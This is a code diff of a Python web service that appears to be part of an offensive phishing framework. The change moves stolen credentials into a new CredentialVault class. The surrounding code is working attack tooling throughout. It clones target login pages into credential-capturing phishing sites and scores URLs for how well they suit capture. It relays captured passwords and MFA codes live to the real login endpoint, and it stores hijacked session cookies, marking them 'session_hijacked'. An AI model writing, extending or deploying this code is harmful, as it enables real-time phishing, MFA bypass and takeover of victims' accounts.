@@ -17,8 +17,9 @@ from pydantic import BaseModel
 
 from core.auth import verify_api_key
 from core.config import OPEN_CORS_HEADERS, now
-from core.replay import get_http_client, get_replay_headers
+from core.replay import get_http_client
 from core.sse import broadcast
+from core.vault import CredentialVault
 from core import state
 
 PHISH_CACHE_ROOT = Path(__file__).parent.parent / "phish_cache"
@@ -400,7 +401,7 @@ async def _score_url(client, url: str, headers: dict) -> dict:
 
 
 @router.post("/r3d/attack/phish/suggest", dependencies=[Depends(verify_api_key)])
-async def phish_suggest(body: PhishSuggestRequest):
+async def phish_suggest(body: PhishSuggestRequest, request: Request):
     """Score candidate URLs for credential-capture suitability."""
     urls = list(dict.fromkeys(body.urls))[:15]
     if not urls:
@@ -411,7 +412,8 @@ async def phish_suggest(body: PhishSuggestRequest):
 
     sample_origin = urlparse(urls[0])
     origin = f"{sample_origin.scheme}://{sample_origin.netloc}"
-    headers = get_replay_headers(origin, {}) if body.useAuthContext else {}
+    vault: CredentialVault = request.app.state.credential_vault
+    headers = await vault.get_replay_headers(origin, {}) if body.useAuthContext else {}
 
     async with get_http_client(timeout=12, follow_redirects=True) as client:
         tasks = [_score_url(client, u, headers) for u in urls]
@@ -439,7 +441,7 @@ async def phish_suggest(body: PhishSuggestRequest):
 
 
 @router.post("/r3d/attack/phish/clone", dependencies=[Depends(verify_api_key)])
-async def phish_clone(body: PhishCloneRequest):
+async def phish_clone(body: PhishCloneRequest, request: Request):
     """Clone a target URL into a serveable phish site with credential capture."""
     site_id = uuid4().hex[:8]
     cache_dir = PHISH_CACHE_ROOT / site_id
@@ -448,7 +450,8 @@ async def phish_clone(body: PhishCloneRequest):
 
     parsed = urlparse(body.url)
     origin = f"{parsed.scheme}://{parsed.netloc}"
-    headers = get_replay_headers(origin, {}) if body.useAuthContext else {}
+    vault: CredentialVault = request.app.state.credential_vault
+    headers = await vault.get_replay_headers(origin, {}) if body.useAuthContext else {}
 
     try:
         info = await _clone_page(
@@ -575,7 +578,7 @@ async def phish_relay_configure(site_id: str, body: PhishRelayRequest):
     )
 
 
-async def _relay_credentials(site_id: str, fields: dict, meta: dict):
+async def _relay_credentials(site_id: str, fields: dict, meta: dict, vault: CredentialVault):
     """Replay captured credentials against the real target login endpoint."""
     relay_cfg = meta.get("relay", {})
     if not relay_cfg.get("enabled"):
@@ -605,7 +608,7 @@ async def _relay_credentials(site_id: str, fields: dict, meta: dict):
     })
 
     try:
-        headers = get_replay_headers(origin, {"Content-Type": "application/x-www-form-urlencoded"})
+        headers = await vault.get_replay_headers(origin, {"Content-Type": "application/x-www-form-urlencoded"})
         form_data = "&".join(f"{k}={v}" for k, v in fields.items())
 
         async with get_http_client(timeout=20, follow_redirects=True) as client:
@@ -634,14 +637,11 @@ async def _relay_credentials(site_id: str, fields: dict, meta: dict):
                 return
 
             if resp.status_code < 400 and cookies_dict:
-                from core.replay import auth_contexts
                 cookie_str = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
-                auth_contexts[origin] = {
-                    "cookies": cookie_str,
-                    "headers": {},
-                    "userAgent": meta.get("captured", [{}])[-1].get("userAgent", ""),
-                    "ts": now().isoformat(),
-                }
+                await vault.store(
+                    origin, cookie_str, {},
+                    meta.get("captured", [{}])[-1].get("userAgent", ""),
+                )
                 meta["relay"]["status"] = "session_hijacked"
                 state.relay_sessions.pop(site_id, None)
                 broadcast("phish_relay_success", {
@@ -668,7 +668,7 @@ async def _relay_credentials(site_id: str, fields: dict, meta: dict):
         })
 
 
-async def _relay_mfa(site_id: str, fields: dict, meta: dict):
+async def _relay_mfa(site_id: str, fields: dict, meta: dict, vault: CredentialVault):
     """Replay an MFA code using the intermediate session from the first relay step."""
     relay_session = state.relay_sessions.get(site_id)
     if not relay_session or relay_session.get("status") != "waiting_for_mfa":
@@ -706,14 +706,8 @@ async def _relay_mfa(site_id: str, fields: dict, meta: dict):
                 final_cookies[cookie.name] = cookie.value
 
             if resp.status_code < 400 and final_cookies:
-                from core.replay import auth_contexts
                 cookie_str = "; ".join(f"{k}={v}" for k, v in final_cookies.items())
-                auth_contexts[origin] = {
-                    "cookies": cookie_str,
-                    "headers": {},
-                    "userAgent": "",
-                    "ts": now().isoformat(),
-                }
+                await vault.store(origin, cookie_str, {}, "")
                 meta["relay"]["status"] = "session_hijacked"
                 state.relay_sessions.pop(site_id, None)
                 broadcast("phish_relay_success", {
@@ -781,25 +775,25 @@ async def phish_capture(site_id: str, request: Request):
         cap_type = data.get("t", "")
         fields = data.get("fields", {})
 
+        vault: CredentialVault = request.app.state.credential_vault
         if cap_type == "mfa" or (cap_type == "form" and state.relay_sessions.get(site_id, {}).get("status") == "waiting_for_mfa"):
-            asyncio.ensure_future(_relay_mfa(site_id, fields, meta))
+            asyncio.ensure_future(_relay_mfa(site_id, fields, meta, vault))
         elif cap_type in ("form", "blur") and fields:
             has_password = any(_CRED_FIELD_RE.search(k) for k in fields)
             if has_password:
-                asyncio.ensure_future(_relay_credentials(site_id, fields, meta))
+                asyncio.ensure_future(_relay_credentials(site_id, fields, meta, vault))
         elif cap_type == "snapshot":
             cookies = data.get("cookies", "")
             if cookies:
-                from core.replay import auth_contexts
                 origin = meta.get("targetOrigin", "")
                 if origin:
-                    existing = auth_contexts.get(origin, {})
-                    auth_contexts[origin] = {
-                        "cookies": cookies,
-                        "headers": existing.get("headers", {}),
-                        "userAgent": existing.get("userAgent", entry.get("userAgent", "")),
-                        "ts": now().isoformat(),
-                    }
+                    existing = await vault.get_context(origin)
+                    await vault.store(
+                        origin,
+                        cookies,
+                        existing.get("headers", {}),
+                        existing.get("userAgent", entry.get("userAgent", ""))
+                    )
 
     return Response(status_code=204)
 
